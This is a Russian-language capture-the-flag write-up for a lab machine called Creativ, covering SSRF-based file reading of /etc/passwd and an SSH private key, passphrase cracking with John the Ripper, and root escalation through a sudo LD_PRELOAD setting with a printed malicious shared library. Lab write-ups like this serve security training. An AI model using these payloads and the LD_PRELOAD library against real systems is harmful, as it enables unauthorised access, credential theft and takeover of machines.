# Creativ — SSRF, LFI и повышение привилегий через LD_PRELOAD

## Разведка и поиск поддомена

На основном домене `creative.thm` находилась простая веб-страница. Я проверил поддомены и обнаружил `beta.creative.thm`.

![Основная веб-страница Creativ](../images/Pasted%20image%2020260328152539.png)

![Обнаруженный beta-поддомен](../images/Pasted%20image%2020260328153718.png)

## SSRF через beta-приложение

На beta-поддомене была форма, которая принимала URL. Сначала я проверил возможность XSS с помощью payload на основе старой версии jQuery:

```javascript
var payload2 = '<option><style></option></select><img src=x onerror=alert("XSS_Success")></style>';
```

После этого проверил, может ли сервер обращаться к внутренним адресам. Через SSRF удалось обратиться к локальному сервису на порту `1337`:

```text
http://localhost:1337/etc/passwd
```

Сервис позволял читать файлы, поэтому я получил список пользователей и нашёл пользователя `saad`.

## SSH-доступ

Проверил стандартный путь к приватному ключу:

```text
/home/saad/.ssh/id_rsa
```

Ключ оказался защищён passphrase. Преобразовал его для John the Ripper и запустил подбор:

```bash
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Passphrase ключа — `sweetness`. После этого я подключился к серверу по SSH и получил первый флаг.

## Повышение привилегий

В истории команд пользователя нашёл пароль:

```text
MyStrongestPasswordYet$4291
```

После входа под `saad` проверил разрешения:

```bash
sudo -l
```

В выводе была опасная настройка `env_keep+=LD_PRELOAD`. Она позволяла сохранить переменную `LD_PRELOAD` при запуске разрешённой команды через `sudo`.

Подготовил динамическую библиотеку, которая при загрузке сбрасывала UID/GID в `0` и запускала Bash:

```c
#include <stdlib.h>
#include <sys/types.h>

void _init(void) {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Скомпилировал её в shared object:

```bash
gcc -shared -fPIC -o /tmp/root.so root.c
```

Затем передал библиотеку разрешённой команде:

```bash
sudo LD_PRELOAD=/tmp/root.so /usr/bin/ping 127.0.0.1
```

`ping` запустился с правами root, загрузил мою библиотеку, и я получил привилегированную оболочку.

## Итоговая цепочка

1. Нашёл beta-поддомен.
2. Использовал SSRF для доступа к локальному сервису на `1337`.
3. Прочитал SSH-ключ пользователя `saad`.
4. Восстановил passphrase ключа через John the Ripper.
5. Нашёл пароль в `.bash_history`.
6. Использовал `LD_PRELOAD` через разрешения `sudo` и получил root.
